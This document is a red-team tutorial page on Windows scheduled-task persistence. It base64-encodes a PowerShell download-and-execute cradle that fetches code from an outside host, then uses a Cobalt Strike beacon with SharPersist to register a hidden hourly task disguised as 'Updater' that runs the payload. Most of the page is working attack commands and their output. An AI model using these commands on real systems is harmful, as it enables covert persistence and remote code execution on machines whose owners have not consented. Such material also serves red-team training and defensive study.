# Scheduled Tasks

## Creating Tasks

Windows Task Scheduler allows us to create tasks that execute on a pre-defined trigger. For example they can be:

* Time of day
* User Login
* Computer Idle
* Every n hours, minutes, seconds

### Building Payload

For this example we will base64 encode our PowerShell payload using -enc (-EncodedCommand)

<pre class="language-powershell"><code class="lang-powershell">PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://copperwired.com/a"))'

<strong>PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
</strong></code></pre>

#### Output:

```powershell
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBjAG8AcABwAGUAcgB3AGkAcgBlAGQAL
gBjAG8AbQAvAGEAIgApACkA
```

### Execute Payload - SharPersist & Cobalt Strike

We can use the `execute-shellcode` command from an existing beacon in CobaltStrike to establish persistence. We'll also have to utilize a tool like [SharPersist](https://github.com/mandiant/SharPersist) as there are no built-in persistence tools.&#x20;

```powershell
beacon> execute-assembly C:\Tools\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc 
SQBFAFgAIAAo...ACgAbgBlAHcALQBvAGkA" -n "Updater" -m add -o hourly
```

* `-t` is the desired persistence technique.
* `-c` is the command to execute.
* `-a` are any arguments for that command.
* `-n` is the name of the task.
* `-m` is to add the task (you can also `remove`, `check` and `list`).
* `-o` is the task frequency.

### Confirm

We can confirm we successfully created a scheduled task by opening the Task Scheduler.

<figure><img src="../../.gitbook/assets/Screenshot 2024-07-31 at 2.09.43 AM.png" alt=""><figcaption></figcaption></figure>
